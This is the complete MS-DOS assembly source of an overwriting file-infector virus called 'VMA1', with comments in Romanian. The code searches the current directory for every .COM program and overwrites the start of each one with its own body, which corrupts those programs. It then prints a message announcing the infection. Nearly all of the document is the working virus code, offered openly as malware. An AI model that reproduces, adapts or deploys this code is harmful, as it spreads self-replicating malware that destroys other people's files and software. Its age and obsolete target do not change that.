; ============================================
; =            VMA1 VIRUS                    =
; =  Overwrite first part of .COM programs   =
; =  Affected programs will become corrupted =
; =  Check VMA2 VIRUS for info on how to     =
; =  prevent corruption                      =
; ============================================

lungime equ ((offset sfirsit)-(offset entry))
.model tiny
.code
org 100h
entry:
      mov dx,offset mesaj        ; afiseaza mesajul virusului
      mov ah,9
      int 21h

      mov ah,4eh                 ; cauta primul fisier .COM
      mov dx,offset cale
      xor cx,cx
      int 21h
      jc retu
open:
      mov ax,3d01h               ; deschide fisierul in mod scriere
      mov dx,9eh
      int 21h
      jc retu
      push ax

      mov bx,ax                  ; copiaza virusul in fisier
      mov dx,offset entry
      mov cx,lungime
      mov ah,40h
      int 21h

      pop bx                     ; inchide fisierul pe care l-a virusat
      mov ah,3eh
      int 21h

      mov ah,4fh                 ; cauta urmatorul fisier .COM
      int 21h
      jnc open
retu:
      ret                        ; revine in sistem

mesaj db 13,10,'  --- Your computer has now VMA1 virus !!! ---',13,10,'$'
cale  db '*.COM',0
sfirsit:
end   entry
